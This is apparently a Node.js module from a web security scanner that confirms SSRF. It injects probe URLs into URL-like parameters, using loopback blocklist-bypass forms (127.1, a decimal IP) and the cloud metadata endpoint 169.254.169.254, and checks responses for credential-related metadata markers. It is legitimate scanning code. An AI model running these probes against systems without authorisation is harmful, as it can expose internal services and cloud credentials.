const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { dedupByEndpointParam, dedupParamUrls } = require('./ssti_confirm');

// Only params a server genuinely FETCHES — redirect/reflection-prone names are
// left to the open-redirect / XSS modules to avoid false positives.
const URLISH = /^(url|uri|link|src|source|fetch|proxy|load|feed|resource|callback|webhook|dest|destination|host|domain|site|open|target|remote|image_?url|avatar|file_?url|document|upload|upload_url|endpoint|server|path)$/i;
const META_MARKER = /ami-id|instance-id|iam\/|local-ipv4|security-credentials|computeMetadata/i;
// The proof string is returned only by the canary endpoint's RESPONSE body — it
// is never part of the request, so a merely reflected param value can't fake it,
// and redirect:'manual' stops an open-redirect from reaching the canary.
const PROOF = 'WK_CANARY_PROVEN';

class SsrfConfirm extends BaseModule {
  static moduleName = 'ssrf_confirm';
  static phase = 'P6c';
  static toolsNeeded = [];

  async execute() {
    const urls = dedupParamUrls(this.workspace, this.scope);
    if (!urls.length) return new ModuleResult({ module: SsrfConfirm.moduleName, status: 'skipped', errors: ['No parameterized URLs'] });
    const ua = this.config.user_agent || 'WebKiller/2.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      for (const url of urls.slice(0, this.config.ssrf_max_urls || 40)) {
        let parsed; try { parsed = new URL(url); } catch { continue; }
        const urlParams = [...parsed.searchParams.keys()].filter(k => URLISH.test(k));
        if (!urlParams.length) continue;
        // Baseline guards the metadata probe against pages that already contain
        // cloud-metadata vocabulary (the PROOF probes can't be faked, so no baseline).
        let baseBody = '';
        try { const b = new URL(url); b.searchParams.set(urlParams[0], 'wk_baseline_value'); const br = await fetch(b.href, { headers: { 'User-Agent': ua }, redirect: 'manual', signal: AbortSignal.timeout(8000) }); baseBody = await br.text(); } catch { /* ignore */ }
        const port = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
        // Canary variants cover a string blocklist (127.1 / decimal IP); the
        // metadata probe catches real cloud SSRF. (Blind SSRF needs an OOB
        // server — config.oob_url + config.oob_marker.)
        const probes = [
          { u: `${parsed.protocol}//${parsed.hostname}:${port}/__canary`, needle: PROOF },
          { u: `http://127.1:${port}/__canary`, needle: PROOF },
          { u: `http://2130706433:${port}/__canary`, needle: PROOF },
          { u: 'http://169.254.169.254/latest/meta-data/', needle: null },
        ];
        if (this.config.oob_url) probes.unshift({ u: this.config.oob_url, needle: this.config.oob_marker || PROOF });
        let hit = false;
        for (const pName of urlParams) {
          for (const probe of probes) {
            try {
              const t = new URL(url); t.searchParams.set(pName, probe.u);
              const resp = await fetch(t.href, { headers: { 'User-Agent': ua }, redirect: 'manual', signal: AbortSignal.timeout(8000) });
              const body = await resp.text();
              const ok = probe.needle ? body.includes(probe.needle) : (META_MARKER.test(body) && !META_MARKER.test(baseBody));
              if (ok) {
                confirmed.push({ name: `SSRF: ${pName}`, severity: 'high', url, evidence: { param: pName, probe: probe.u, note: 'server fetched an attacker-supplied URL and returned the response' }, type: 'dast_confirmed', vuln_class: 'ssrf', module: SsrfConfirm.moduleName });
                hit = true; break;
              }
            } catch { /* skip */ }
          }
          if (hit) break;
        }
      }
    } finally { popInsecureTLS(); }
    const out = dedupByEndpointParam(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: SsrfConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'canary-reflection' });
  }
}
module.exports = SsrfConfirm;
